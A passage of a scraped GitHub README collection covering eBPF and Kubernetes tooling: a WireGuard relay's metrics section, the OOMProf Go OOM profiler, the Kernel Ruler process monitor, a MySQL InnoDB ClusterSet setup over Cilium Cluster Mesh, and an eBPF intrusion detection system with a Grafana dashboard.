Expose Prometheus metrics for monitoring with Grafana dashboards:

```yaml
monitoring:
  prometheus:
    enabled: true
    listen: "":9090""
```

Available metrics:

- `wg_relay_packets{mode, direction, reason}` - Total packets processed
- `wg_relay_bytes{mode, direction, reason}` - Total bytes processed

Labels:

- `mode`: ""forward"" or ""reverse""
- `direction`: ""from_wg"" or ""to_wg""
- `reason`: ""forwarded"", ""dropped"", etc.

## Development

### Devcontainer Setup

For development, you can use the provided devcontainer setup in `.devcontainer` directory. This allows you to work in a
consistent environment with all dependencies pre-installed. Specially in non-linux environments.

```bash

### Testing with Network Namespaces
```bash
# Create test namespaces
sudo bash setup-netns.sh

# Run proxy in namespace
sudo make run-forward-proxy
```"
parca-dev/oomprof,117,3,117,2,C,eBPF OOM Memory Profiler,2025-06-24T20:01:21Z,2025-10-10T13:30:14Z,34,"# OOMProf - eBPF-based OOM Kill Profiler

OOMProf is an eBPF-based process monitor that automatically captures heap profiles from Go programs just before they are killed by the Linux Out-of-Memory (OOM) killer, or on-demand for specific processes. This enables post-mortem analysis of memory usage patterns that led to OOM conditions.

## Features

- **Real-time Go process detection**: Automatically discovers and monitors running Go programs
- **Pre-OOM profiling**: Captures memory profiles at the moment of OOM kill signals
- **On-demand profiling**: Profile specific processes by PID using the `-p` flag
- **eBPF-powered monitoring**: Uses kernel tracepoints for low-overhead and stable process monitoring
- **Standard pprof output**: Generates profiles compatible with Go's pprof toolchain
- **Memory limit testing**: Includes cgroup-based testing framework for reproducible OOM scenarios

## How It Works

OOMProf uses eBPF tracepoints to monitor kernel OOM killer events and automatically:

1. **Scans** the system for running Go processes and tracks their memory bucket addresses
2. **Detects** when the OOM killer is about to terminate a Go process via `oom/mark_victim` tracepoint
3. **Captures** the process's heap profile data from kernel space using `signal/signal_deliver` tracepoint
4. **Generates** a standard pprof-compatible profile file

The captured profiles show memory allocation patterns, call stacks, and heap usage that can help identify memory leaks, excessive allocations, or other issues that led to the OOM condition.

## Requirements

- Linux kernel with eBPF support (4.9+)
- Root privileges (required for eBPF program loading)
- Go 1.21+ for building

## Installation

```bash
# Clone the repository
git clone https://github.com/parca-dev/oomprof.git
cd oomprof

# Build the binaries
make
```

This creates:
- `oompa` - Main OOMProf monitor (OOM Profiler Agent)
- `tests/oomer.taux` - Test binary for generating OOM conditions
- `tests/gccache.taux` - Test binary for GC cache stress testing
- `oomprof.test` - Test suite

## Usage

### Basic Monitoring

Run OOMProf as root to monitor all Go processes:

```bash
sudo ./oompa
```

When a Go process is OOM killed, `oompa` will automatically generate a profile file named `{command}-{pid}.pb.gz`.

### On-Demand Profiling

Profile specific processes by PID using the `-p` flag with comma-delimited PIDs:

```bash
# Profile a single process
sudo ./oompa -p 1234

# Profile multiple processes
sudo ./oompa -p 1234,5678,9012
```

This will generate profile files for each specified PID and exit once profiling is complete.

### Analyzing Profiles

View the captured profile using Go's pprof tool:

```bash
# Interactive analysis
go tool pprof {command}-{pid}.pb.gz

# Generate a web interface
go tool pprof -http=:8080 {command}-{pid}.pb.gz

# View top memory consumers
go tool pprof -top {command}-{pid}.pb.gz
```

### Programmatic Usage

OOMProf can be used as a library in your own applications:

```go
package main

import (
    ""context""
    ""fmt""
    ""log""
    ""os""
    ""time""

    ""github.com/parca-dev/oomprof/oomprof""
)

func main() {
    profileChan := make(chan oomprof.ProfileData)
    state, err := oomprof.Setup(context.Background(), &oomprof.Config{}, profileChan)
    if err != nil {
        fmt.Fprintf(os.Stderr, ""Failed to setup OOM profiler: %v\n"", err)
        os.Exit(1)
    }
    defer state.Close()

    for profile := range profileChan {
        // Create filename with timestamp: command-pid-YYYYMMDDHHmmss.pb.gz
        timestamp := time.Now().Format(""20060102150405"")
        filename := fmt.Sprintf(""%s-%d-%s.pb.gz"", profile.Command, profile.PID, timestamp)

        f, err := os.Create(filename)
        if err != nil {
            log.Printf(""Failed to create profile file %s: %v\n"", filename, err)
            continue
        }
        if err := profile.Profile.Write(f); err != nil {
            log.Printf(""Failed to write profile %s: %v\n"", filename, err)
        }
        f.Close()
        log.Printf(""Saved profile for %s (PID %d) to %s\n"", profile.Command, profile.PID, filename)
    }
}
```

### Testing with Controlled OOM

Test OOMProf with the included test binaries:

```bash
# Run tests with different memory limits
sudo go test -v ./oomprof -run TestOOMProf

# Test with specific memory constraints
sudo go test -v ./oomprof -run TestOOMProfLowMemoryLimits
```

## Configuration

### Environment Variables

- `GODEBUG=memprofilerate=1` - Enable detailed memory profiling (set automatically by test programs)


## Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Go Process    â”‚    â”‚       eBPF       â”‚    â”‚   OOMProf       â”‚
â”‚                 â”‚    â”‚                  â”‚    â”‚                 â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Memory      â”‚ â”‚    â”‚ â”‚ oom/mark_    â”‚ â”‚    â”‚ â”‚ Process     â”‚ â”‚
â”‚ â”‚ Allocations â”‚ â”‚â”€â”€â”€â”€â”¼â–¶â”‚ victim       â”‚ â”‚â”€â”€â”€â”€â”¼â–¶â”‚ Scanner     â”‚ â”‚
â”‚ â”‚             â”‚ â”‚    â”‚ â”‚ signal/      â”‚ â”‚    â”‚ â”‚             â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â”‚ signal_      â”‚ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                 â”‚    â”‚ â”‚ deliver      â”‚ â”‚    â”‚                 â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ runtime.    â”‚ â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”‚ Profile     â”‚ â”‚
â”‚ â”‚ mbuckets    â”‚ â”‚â—€â”€â”€â”€â”¼â”€â”¤ record_      â”‚ â”œâ”€â”€â”€â”€â”¼â–¶â”‚ Generator   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â”‚ profile_     â”‚ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                 â”‚    â”‚ â”‚ buckets      â”‚ â”‚    â”‚                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## Development

### Building

```bash
# Generate eBPF objects and build binaries
make

# Run tests (requires root)
sudo go test -v ./oomprof

# Run specific test with memory limits
sudo go test -v ./oomprof -run TestOOMProfLowMemoryLimits
```

### Project Structure

```
oomprof/
â”œâ”€â”€ main.go              # CLI interface
â”œâ”€â”€ oomprof.c            # eBPF programs (kernel space)
â”œâ”€â”€ oomprof/
â”‚   â”œâ”€â”€ monitor.go       # Main monitoring logic
â”‚   â”œâ”€â”€ pprof.go         # Profile generation
â”‚   â””â”€â”€ oomprof_test.go  # Test suite
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ oomer/           # Memory allocation test scenarios
â”‚   â”œâ”€â”€ gccache/         # GC cache stress test program
â”‚   â””â”€â”€ compile-oom/     # Go compiler stress test program
â””â”€â”€ include/             # eBPF headers
```

## Roadmap

### Current Features (MVP)
- [x] eBPF-based OOM monitoring
- [x] Go process heap profiling
- [x] Standard pprof output format
- [x] Cgroup-based testing framework

### Planned Features
- [ ] Goroutine dump collection
- [ ] Kubernetes/cgroup deployment support
- [ ] Remote profile upload (pprof.me integration)
- [ ] Integration with standard observability reporters
- [ ] jemalloc/tcmalloc/mimalloc support
- [ ] Python memory profiling

## Contributing

Contributions are welcome! Please see the [development](#development) section for build instructions and testing guidelines.

## License

This project is licensed under the Apache License 2.0. See LICENSE for details.
"
Kagnite/Kernel-Ruler,18,0,18,0,Go,,2025-08-21T23:23:03Z,2025-09-16T11:08:36Z,18,"# ðŸ§‘â€ðŸ’» Kernel Ruler

A modern terminal-based **process monitoring tool** built with **Go**, **eBPF**, and the [Bubble Tea](https://github.com/charmbracelet/bubbletea) TUI framework.  
Think of it like `htop` + `pstree`, but focused on **real-time process execution tracking**.

---

## ðŸŽ¥ Demo
![KernelRuler Demo](docs/demo.webp)

---

## âœ¨ Features
- ðŸ“¡ Hooks into `execve` syscalls with **eBPF** to capture new processes instantly.  
- ðŸ“ Live, filterable list of processes with PID, command, timestamp.  
- ðŸŒ³ **Tree view**: visualize parent/child process hierarchy.  
- ðŸ“œ **Details panel**: PID, PPID, user, status, full command (from `/proc`).  
- âš¡ Press **k** to kill a process directly from the UI.  
- ðŸ” Search & filter by process name.  
- ðŸŽ¨ Clean TUI powered by Bubble Tea + Lipgloss.  

---

## ðŸš€ Installation (from source)

```bash
git clone https://github.com/Kagnite/Kernel-Ruler.git
cd Kernel-Ruler
go build -o kernelruler main.go
sudo ./kernelruler
```
## ðŸ³ Installation & Run with Docker

```
git clone https://github.com/Kagnite/Kernel-Ruler.git
cd Kernel-Ruler

# Build Docker image (make sure you spelled kernelruler correctly!)
docker build -t kernelruler:test .

# Mount bpffs if not already mounted
sudo mount -t bpf bpf /sys/fs/bpf || true

# Run the container
docker run --rm -it \
  --privileged \
  --pid=host \
  -v /sys/fs/bpf:/sys/fs/bpf \
  -v /sys/kernel/debug:/sys/kernel/debug \
  kernelruler:test
```
## Run in background

```
docker run -d -it --name kernelruler \
  --privileged --pid=host \
  -v /sys/fs/bpf:/sys/fs/bpf \
  -v /sys/kernel/debug:/sys/kernel/debug \
  kernelruler:test
```
## Attach later:
```
docker attach kernelruler
# Detach without killing: Ctrl+P then Ctrl+Q
```
## Restart:
```
docker start -ai kernelruler
```
## âŒ¨ Usage:
```
  â†‘/â†“   Navigate process list
  /     Search & filter
  t     Toggle tree view
  enter Show process details
  k     Kill selected process
  q     Quit
```
## âš™ Prerequisites - Go 1.21+ - Linux with eBPF support - Kernel headers installed (example on Debian/Ubuntu):
```
  sudo apt install linux-headers-$(uname -r)
```
"
colussim/mysql-innodb-clusterset-cilium,3,0,3,0,,Running a MySQL InnoDB ClusterSet Across Multiple Kubernetes Clusters Using Cilium,2025-08-14T14:00:22Z,2025-08-30T22:17:31Z,8," ![Kubernetes](https://img.shields.io/badge/kubernetes-%23326ce5.svg?style=for-the-badge&logo=kubernetes&logoColor=white) ![MySQL](https://img.shields.io/badge/MySQL-4479A1?style=flat&logo=mysql&logoColor=white)![Static Badge](https://img.shields.io/badge/MySQL_Operator-V9.4.0-blue:)![Static Badge](https://img.shields.io/badge/Cilium-V1.18.0-blue:)

# ðŸš€ Deploying MySQL InnoDB ClusterSet Across Multiple Kubernetes Clusters with Cilium

## ðŸ“˜ Introduction

This project demonstrates how to deploy a MySQL InnoDB ClusterSet across two Kubernetes clusters interconnected using Cilium Cluster Mesh.

We are building a unified, multi-cluster MySQL architecture with high availability and service discovery â€” all running on a single VM using lightweight Kubernetes environments.

![cilium-mesh2.drawio.png](imgs/cilium-mesh2.drawio.png)

---

## ðŸ”§ Infrastructure Overview

The infrastructure consists of a single cloud-hosted virtual machine running two KIND (Kubernetes IN Docker) clusters. KIND provides a fast and convenient way to spin up Kubernetes clusters locally in Docker containers, making it ideal for development, testing, and experimentation.

Cilium is used as the CNI (Container Network Interface) plugin for both clusters, offering:
- âš¡ï¸ Built-in LoadBalancer support
- ðŸ“¡ Efficient L2 routing and service announcements
- ðŸ” Powerful eBPF-based network policies
- ðŸ”— Cluster Mesh for seamless multi-cluster connectivity

With Cilium Cluster Mesh, pods and services in each cluster can discover and communicate across cluster boundaries as if they were on the same flat network, regardless of Kubernetes distribution or hosting location.

```mermaid
graph TD
    VM[""Cloud-hosted Virtual Machine""]
    subgraph KIND Cluster 1
        K1[""Kubernetes Cluster 1""]
        C1[""Cilium CNI""]
    end
    subgraph KIND Cluster 2
        K2[""Kubernetes Cluster 2""]
        C2[""Cilium CNI""]
    end
    VM --> K1
    VM --> K2
    K1 --> C1
    K2 --> C2
    C1 <--> C2
    note1[""Cilium Cluster Mesh""]
    C1 --- note1
    C2 --- note1
```
---

## ðŸ“ Prerequisites

Before you begin, ensure you have:
- Two operational Kubernetes clusters (e.g., created with KIND)
- Cilium installed as the CNI plugin on both clusters
- The MySQL Operator installed on both clusters
- One MySQL InnoDB Cluster deployed in each Kubernetes cluster
- The `kubectl` command-line tool installed and configured

---

## ðŸ¬ MySQL Deployment

Both clusters run MySQL Enterprise using the official MySQL Operator for Kubernetes, enabling:
- Native InnoDB Cluster support
- Automatic failover and recovery
- Seamless cross-cluster replication

> âš ï¸ This article does not cover the installation of the Kubernetes clusters (KIND),the MySQL Operator or detailed deployment of InnoDB clusters.
> For step-by-step instructions, refer to:
> - [Kubernetes Test Platform with Kind and Cilium](https://github.com/colussim/kind-cilium-lab)
> - [MySQL Operator for Kubernetes - Documentation](https://dev.mysql.com/doc/mysql-operator/en/)
> - [Deploy a MySQL InnoDB Cluster on Kubernetes with MySQL Operator](https://github.com/colussim/mysql-innodb-k8s-operator)

> **âš ï¸ Note (MySQL Operator 9.4 for Kubernetes):**
>
> When you deploy an **InnoDBCluster**, the Operator **automatically creates a ClusterSet** with the **same name**.
>
> **Implications:**
> - You may see a `ClusterSet` resource even if you only requested a single cluster.
> - **Deleting the ClusterSet will also delete the associated InnoDBCluster.**
> - Plan your naming accordingly and avoid removing the ClusterSet unless you intend to remove the cluster as well.
>
> **Why this happens:**
> - The Operator prepares for future scale-out (adding replica clusters) without extra steps.
>
> **Recommendation:**
> - For standalone setups, keep the auto-created ClusterSet and operate your single cluster as usual. For multi-site setups, attach additional clusters to this ClusterSet.

---

## ðŸ› ï¸ Step 1 â€“ Setting Up Cluster Mesh

Before connecting the clusters with Cilium Cluster Mesh, ensure you have two Kubernetes clusters running with Cilium installed as the CNI.

Both clusters in this setup are created using KIND.

**ðŸ” Check Existing KIND Clusters**

To view the existing KIND clusters on your machine:
```bash
kind get clusters
```

List Kubernetes contexts:
```bash
kubectl config get-contexts
```

To switch context:
```bash
kubectl config use-context kind-k8sdemos2
```

**ðŸ¬ Checking MySQL InnoDB Cluster**

To list deployed InnoDB Clusters managed by the operator in each Kubernetes cluster:
```bash
kubectl get innodbclusters -A --context=kind-k8sdemos2
kubectl get innodbclusters -A --context=kind-k8sdemos3
```

**ðŸ› ï¸ Additional Requirements for Native Routing Paths**

To enable native routing across clusters in Cilium Cluster Mesh, each clusterâ€™s Cilium must be configured with a native routing CIDR that covers all PodCIDR ranges of the connected clusters. All clusters must also use the same *maxConnectedClusters* value.

**ðŸ” Identify PodCIDR Ranges of Each Cluster**

Check PodCIDRs:
```bash
kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"" - ""}{.spec.podCIDR}{""\n""}{end}'
```

If your clusters use PodCIDRs in the 10.x.x.x range, use the global routing CIDR 10.0.0.0/8.

**âš™ï¸ Configure Cilium Native Routing CIDR**

Patch the Cilium ConfigMap:
```bash
kubectl patch configmap cilium-config -n kube-system --type merge -p '{""data"": {""ipv4-native-routing-cidr"": ""10.0.0.0/8""}}'
```

**ðŸ”„ Restart Cilium DaemonSet**
```bash
kubectl rollout restart ds/cilium -n kube-system
```

**âœ… Verify Configuration**
```bash
kubectl -n kube-system exec -it ds/cilium -- cilium status
cilium status --wait
```

> âš ï¸ Repeat these modifications on the second cluster if necessary.

---

## ðŸ› ï¸ Step 2 â€“ Prepare the Clusters

Connect the two clusters using their respective kubectl contexts, stored in the environment variables $CLUSTER1 and $CLUSTER2.

Each cluster requires a unique, human-readable name and a numeric cluster ID (between 1 and 255).

**Cluster Name Requirements**
- Maximum length: 32 characters
- Must start and end with a lowercase alphanumeric character (a-z, 0-9)
- Can contain lowercase alphanumeric characters and dashes (-) in between

Patch ConfigMap for cluster_id:
```bash
kubectl patch configmap cilium-config -n kube-system --type merge -p '{""data"": {""cluster-id"": ""1""}}'
```

> âš ï¸ Ensure each cluster has a unique name and cluster ID.

Restart Cilium DaemonSet:
```bash
kubectl rollout restart ds/cilium -n kube-system
kubectl rollout restart deployment/cilium-operator -n kube-system
```

> âš ï¸ Repeat on the second cluster.

---

## ðŸ› ï¸ Step 3 â€“ Enable Cluster Mesh

Run `cilium clustermesh enable` in each cluster context to:
- Deploy the clustermesh-apiserver
- Generate and import the required certificates as Kubernetes secrets
- Automatically detect the best LoadBalancer type to expose the ClusterMesh control plane

Set cluster contexts:
```bash
export CLUSTER1=""kind-k8sdemos2""
export CLUSTER2=""kind-k8sdemos3""
```

Enable ClusterMesh:
```bash
cilium clustermesh enable --context $CLUSTER1 --enable-kvstoremesh=false
cilium clustermesh enable --context $CLUSTER2 --enable-kvstoremesh=false
```

Wait for ClusterMesh to be ready:
```bash
cilium clustermesh status --context $CLUSTER1 --wait
```

**ðŸ”— Connect Clusters**

Establish the ClusterMesh link:
```bash
cilium clustermesh connect --context $CLUSTER1 --destination-context $CLUSTER2
```

Check ClusterMesh status:
```bash
cilium clustermesh status --context $CLUSTER1
cilium clustermesh status --context $CLUSTER2
```

**ðŸ” Inspect Registered CiliumNodes**

List all CiliumNodes:
```bash
kubectl get ciliumnodes --context $CLUSTER1
```

If nodes from both clusters appear in each otherâ€™s list, ClusterMesh discovery is working as expected.

---

## ðŸ› ï¸ Step 4 â€“ Multi-Cluster Services API

By default, Cilium does not automatically configure CoreDNS to include the DNS search suffixes of other clusters when using ClusterMesh.

To enable DNS resolution across clusters for Multi-Cluster Services, you have two options:
1. Manually edit the CoreDNS ConfigMap to add the required search domains.
2. Install the Cilium Multi-Cluster Services (MCS) API CRDs.

**ðŸŒ About Cilium MCS API CRDs**

The Cilium MCS API CRDs orchestrate DNS resolution and service connectivity between multiple Kubernetes clusters.

At the DNS level, they:
- Manage service names across clusters
- Enable seamless cross-cluster service discovery
- Allow applications in different clusters to access services using consistent and centralized DNS names

```mermaid
flowchart TD
    subgraph ClusterA[""Kubernetes Cluster A""]
        SA[""Service A""]
        SEA[""ServiceExport (CRD)""]
        CDA[""CoreDNS""]
    end
    subgraph ClusterB[""Kubernetes Cluster B""]
        SB[""Service B""]
        SEB[""ServiceExport (CRD)""]
        CDB[""CoreDNS""]
    end
    subgraph MCSAPI[""Cilium Multi-Cluster Services API""]
        SI[""ServiceImport (CRD)""]
        DNS[""Centralized DNS Resolution""]
    end

    SA -- Export --> SEA
    SB -- Export --> SEB
    SEA -- Sync --> SI
    SEB -- Sync --> SI
    SI -- Register --> DNS
    CDA -- Query --> DNS
    CDB -- Query --> DNS
    DNS -- Resolve --> CDA
    DNS -- Resolve --> CDB

    CDA -- App DNS Query --> SA
    CDB -- App DNS Query --> SB

    note1[""Applications in either cluster can resolve and access services using centralized DNS names (e.g., *.svc.clusterset.local)""]
    DNS --- note1
```    

It is preferable to use the Cilium MCS API rather than the legacy Global Services feature, as MCS-API follows the Kubernetes multicluster standard (ServiceExport / ServiceImport), offers better interoperability, and is actively maintained.

âš ï¸ **Note:** In Cilium version [**1.18**](https://docs.cilium.io/en/stable/network/clustermesh/mcsapi/#gs-clustermesh-mcsapi), the CoreDNS `multicluster` plugin is **not automatically enabled** when using the Multi-Cluster Services API.  
This will change in [**v1.19**](https://docs.cilium.io/en/latest/network/clustermesh/mcsapi/), where CoreDNS can be automatically configured if `clustermesh.mcsapi.corednsAutoConfigure.enabled` is set to `true`.  

For Cilium **1.18**, you must manually update the CoreDNS ConfigMap to enable the `multicluster` plugin. 

**Why Patch CoreDNS and Modify its ConfigMap (MySQL InnoDB ClusterSet Context)**

While the MCS API handles DNS for *.svc.clusterset.local, MySQL InnoDB ClusterSet has additional requirements:
1. Full Pod FQDN Resolution: ClusterSetâ€™s AdminAPI identifies each MySQL instance by its exact fully-qualified domain name and validates it during TLS handshakes.
2. Local Domain Differences: Your clusters use different local DNS suffixes (e.g. k8sdemos2.local, k8sdemos3.local). Without CoreDNS configuration, pods from one cluster cannot resolve the otherâ€™s local FQDNs.
3. NodePort for CoreDNS Service: By default, CoreDNS runs as a ClusterIP service â€” only accessible inside the cluster. Patching it to NodePort gives you a stable, externally reachable DNS endpoint for inter-cluster lookups.

**Summary:**
- Patch ConfigMap â†’ add other clusterâ€™s domain(s) and enable the multicluster plugin.
- Patch Service â†’ expose CoreDNS on a NodePort to allow direct DNS queries between clusters.

Patch CoreDNS service to NodePort:
```bash
kubectl patch svc kube-dns -n kube-system -p '{""spec"": {""type"": ""NodePort""}}' --context <CLUSTER_CONTEXT>
```

Get the NodePort:
```bash
kubectl get svc kube-dns -n kube-system --context <CLUSTER_CONTEXT>
```

Get the nodeâ€™s IP address:
```bash
kubectl get nodes --context <CLUSTER_CONTEXT> -o 'custom-columns=NAME:.metadata.name,INTERNAL-IP:.status.addresses[?(@.type==""InternalIP"")].address'
```

Update CoreDNS forwarding in the other clusterâ€™s CoreDNS config:
```yaml
k8sdemos2.local:53 {
  forward . <node-ip>:32656 <node-ip>:32656 <node-ip>:32656 <node-ip>:32656
}
```

Restart CoreDNS:
```bash
kubectl --context <CLUSTER_CONTEXT> rollout restart deployment -n kube-system coredns
```

**Seed ClusterSet using the local FQDN of a specific instance**

When invoking AdminAPI (e.g., `dba.createReplicaCluster()`), connect to a specific seed instance via its local FQDN (the same as its `report_host`), not via `clusterset.local`:

```bash
kubectl -n innodb01 --context $CLUSTER1 exec -it innodbcluster01-0 -- mysqlsh --uri root@innodbcluster02-0.innodbcluster02-instances.innodb02.svc.k8sdemos3.local -p
```

**Prerequisite**

To use the Cilium MCS API, your cluster must run CoreDNS version 1.12.2 or later.

Check your CoreDNS version:
```bash
kubectl -n kube-system get deployment coredns -o=jsonpath='{.spec.template.spec.containers[0].image}' --context <CLUSTER_CONTEXT>
```

Upgrade CoreDNS if needed:
```bash
kubectl -n kube-system set image deployment/coredns coredns=registry.k8s.io/coredns/coredns:v1.12.2 --context <CLUSTER_CONTEXT>
```

**Deploy the Cilium Multi-Cluster Services (MCS) API**

Install the required MCS-API CRDs:
```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/mcs-api/62ede9a032dcfbc41b3418d7360678cb83092498/config/crd/multicluster.x-k8s.io_serviceexports.yaml --context <CLUSTER_CONTEXT>
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/mcs-api/62ede9a032dcfbc41b3418d7360678cb83092498/config/crd/multicluster.x-k8s.io_serviceimports.yaml --context <CLUSTER_CONTEXT>
```

Patch Cilium ConfigMap:
```bash
kubectl patch configmap cilium-config -n kube-system --type merge --patch '{""data"": {""clustermesh-enable-mcs-api"": ""true""}}' --context <CLUSTER_CONTEXT>
```

Restart Cilium DaemonSet:
```bash
kubectl rollout restart daemonset/cilium -n kube-system --context <CLUSTER_CONTEXT>
kubectl rollout restart deployment/cilium-operator -n kube-system --context <CLUSTER_CONTEXT>
```

Alternatively, use Helm:
```bash
helm upgrade cilium cilium/cilium --version 1.18.0 \
--namespace kube-system \
--reuse-values \
--set clustermesh.enableMCSAPISupport=true --context <CLUSTER_CONTEXT>
```

**Configure CoreDNS for MCS support**

Create a dedicated role and bind it to the CoreDNS service account, then patch the CoreDNS ConfigMap:
```bash
kubectl --context <CLUSTER_CONTEXT> create clusterrole coredns-mcsapi --verb=list,watch resource=serviceimports.multicluster.x-k8s.io
kubectl --context <CLUSTER_CONTEXT> create clusterrolebinding coredns-mcsapi --clusterrole=coredns-mcsapi --serviceaccount=kube-system:coredns 

kubectl --context <CLUSTER_CONTEXT> get configmap -n kube-system coredns -o yaml | \
   sed -e 's/cluster\.local/k8sdemos2.local clusterset.local/g' | \
   sed -E 's/^(.*)kubernetes(.*)\{/\1kubernetes\2{\n\1   multicluster clusterset.local/' | \
   kubectl --context <CLUSTER_CONTEXT> replace -f-
```

Restart CoreDNS:
```bash
kubectl --context <CLUSTER_CONTEXT> rollout restart deployment -n kube-system coredns
```

With CoreDNS now patched for multi-cluster DNS, you can export MySQL InnoDBCluster services via the Kubernetes Multi-Cluster Services (MCS) API, enabling cross-cluster discovery through the svc.clusterset"
sazidul0/Real-Time-eBPF-Intrusion-Detection-System,17,2,17,0,Python,"An eBPF-powered intrusion detection system with an end-to-end pipeline for kernel event monitoring, analysis, and visualization",2025-08-07T14:27:32Z,2025-09-22T03:59:44Z,6,"# Real-Time eBPF Intrusion Detection System

This project implements a professional-grade Intrusion Detection System (IDS) using **eBPF** (extended Berkeley Packet Filter) to monitor system activities in real-time. It captures process executions, file operations, and network connections, applying customizable rules to detect suspicious activities. The system logs alerts to a file and visualizes them through a **Grafana** dashboard powered by **Loki** and **Promtail** for log aggregation and analysis.

## Features
- **Real-Time Monitoring**: Tracks `execve`, `open`, `openat`, and `connect` system calls using eBPF.
- **Rule-Based Detection**: Supports both stateless and stateful rules defined in a YAML configuration file.
- **Customizable Rules**: Detects suspicious activities like executions from temporary directories, web server shell spawning, and potential data exfiltration.
- **Log Visualization**: Integrates with Grafana, Loki, and Promtail for a user-friendly dashboard to visualize alerts by severity, rule, and process details.
- **Dynamic Rule Updates**: Automatically reloads rules when the configuration file changes (requires `watchdog`).
- **Lightweight and Efficient**: Leverages eBPF for low-overhead kernel-level monitoring.

## Project Structure
- **`pro_ids_kernel.c`**: eBPF kernel code to hook system calls and collect events.
- **`pro_ids_userspace.py`**: Python userspace program to process events, apply rules, and log alerts.
- **`pro_rules.yaml`**: Rule configuration file defining detection logic.
- **`IDS Log Dashboard.json`**: Grafana dashboard configuration for visualizing alerts.
- **`ids_alerts.log`**: Sample log file containing generated alerts.
- **`setupUI.sh`**: Script to set up Grafana, Loki, and Promtail containers.
- **`UIStart.sh`**: Script to start/stop the UI containers.
- **`cleanUP.sh`**: Script to clean up Docker containers and network.

## Prerequisites
- **Operating System**: Linux (Ubuntu/Debian recommended) with kernel headers installed.
- **Dependencies**:
  - `build-essential`, `python3-dev`, `python3-pip`
  - `bpfcc-tools`, `libbpfcc-dev`, `linux-headers-$(uname -r)`
  - Python packages: `pyyaml`, `watchdog`
  - Docker (for UI components: Grafana, Loki, Promtail)
- **Privileges**: Root privileges (`sudo`) are required to run the eBPF program.

## Installation
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Sazidul0/Real-Time-eBPF-Intrusion-Detection-System.git
   cd real-time-ebpf-ids
   ```

2. **Install System Dependencies**:
   ```bash
   sudo apt-get update
   sudo apt-get install -y build-essential python3-dev python3-pip
   sudo apt-get install -y bpfcc-tools libbpfcc-dev linux-headers-$(uname -r)
   ```

3. **Install Python Dependencies**:
   ```bash
   pip3 install pyyaml watchdog
   ```

4. **Set Up Docker (for UI)**:
   Ensure Docker is installed and running:
   ```bash
   sudo apt-get install -y docker.io
   sudo systemctl start docker
   sudo systemctl enable docker
   ```

## Usage
### Step 1: Run the IDS
Start the eBPF IDS to monitor system activities and generate logs:
```bash
sudo -E python3 pro_ids_userspace.py --rules pro_rules.yaml --logfile ids_alerts.log
```
- `--rules`: Path to the rule file (default: `pro_rules.yaml`).
- `--logfile`: Path to the output log file (default: `ids_alerts.log`).
- The program monitors system calls and logs alerts based on the defined rules.
- Press `Ctrl+C` to stop the program.

### Step 2: Set Up the UI
1. **Configure the UI Environment**:
   Run the setup script to create Docker containers for Grafana, Loki, and Promtail:
   ```bash
   chmod +x setupUI.sh
   ./setupUI.sh
   ```
   - Provide the absolute path to the `ids_alerts.log` file when prompted.
   - The script creates configuration files and starts the containers.

2. **Start/Stop UI Containers**:
   Use the `UIStart.sh` script to manage the containers:
   ```bash
   chmod +x UIStart.sh
   ./UIStart.sh
   ```
   - Select option `1` to start Grafana, Loki, and Promtail.
   - Select option `2` to stop them.
   - Select option `3` to stop and remove Docker containers and the network.
   - Select option `4` to exit.

3. **Access Grafana**:
   - Open a browser and navigate to `http://localhost:3000`.
   - Log in with default credentials:
     - Username: `admin`
     - Password: `admin` (change the password when prompted).
   - Add a Loki data source:
     - Go to **Configuration** (gear icon) â†’ **Data Sources** â†’ **Add data source**.
     - Select **Loki** and set the URL to `http://loki:3100`.
     - Click **Save & test**.
   - Import the dashboard:
     - Go to **Dashboards** â†’ **Import**.
     - Upload `IDS Log Dashboard.json` or paste its contents.
     - The dashboard displays high/medium/low severity alerts, a severity distribution pie chart, and detailed logs.


## Rules Configuration
The `pro_rules.yaml` file defines detection rules. Each rule specifies:
- `name`: Rule identifier.
- `description`: Description of the detected activity.
- `enabled`: Whether the rule is active (`true`/`false`).
- `event`: Event type (`exec`, `connect`, etc.).
- `severity`: Alert severity (`high`, `medium`, `low`).
